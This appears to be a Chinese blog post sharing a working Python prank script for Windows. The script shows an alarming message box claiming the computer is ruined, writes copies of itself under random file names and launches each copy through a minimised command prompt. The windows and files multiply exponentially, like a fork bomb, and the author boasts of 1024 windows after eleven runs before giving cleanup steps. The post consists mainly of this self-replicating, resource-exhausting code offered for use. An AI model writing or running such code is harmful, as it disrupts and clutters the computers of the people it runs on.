```python
from tkinter import Tk
from tkinter.messagebox import showinfo,showwarning,showerror
from random import randint
from os import system,name

title = "Message"
message = "很不好意思，您的电脑废了"
loops = []
hide = Tk()
hide.withdraw()

def main(): # 实现自我繁衍
    global loops
    randwindow = randint(0,2)
    if randwindow == 0:
        showinfo(title,message)
    elif randwindow == 1:
        showwarning(title,message)
    else:
        showerror(title,message)
    with open(__file__,"r",encoding="utf-8") as f:
        text = f.read()
    for i in range(0,2):
        content = "./%d.py" % randint(100000,999999)
        with open(content,"w",encoding="utf-8") as f:
            f.write(text)
        loops.append(content)
    for i in range(0,2):
        system("start /min cmd /c python %s" % loops[i])

# 此程序仅可在Windows系统运行
if __name__ == "__main__" and name == "nt":
    main()
else:
    showerror("Message","无法运行程序，原因可能是：\n①(1)您非主动运行程序。\n(2)这个程序不能在当前系统下运行，请尝试其他操作系统。")
    exit()
hide.mainloop()

```
这个程序没把我气死。
![在这里插入图片描述](https://pic.2ge.org/cdn/?url=https://img-blog.csdnimg.cn/894416a1d4c64574855c2a97ed27cf0b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5r2Y6YGT54a5,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://pic.2ge.org/cdn/?url=https://img-blog.csdnimg.cn/0d4bef4920fd4f33990c151d1b8e2d2c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5r2Y6YGT54a5,size_20,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://pic.2ge.org/cdn/?url=https://img-blog.csdnimg.cn/fadfa73c59264a56a686cedf667034c3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5r2Y6YGT54a5,size_20,color_FFFFFF,t_70,g_se,x_16)
**按照这样，11次运行后，就能生成`1024`个窗口！！**
怎么关掉呢？？？
第一步干掉进程：`py.exe`和`cmd.exe`。
第二步干掉生成的文件：![在这里插入图片描述](https://pic.2ge.org/cdn/?url=https://img-blog.csdnimg.cn/b05a78a772dd4d498394e17bf5d334f7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5r2Y6YGT54a5,size_20,color_FFFFFF,t_70,g_se,x_16)
好 家 伙
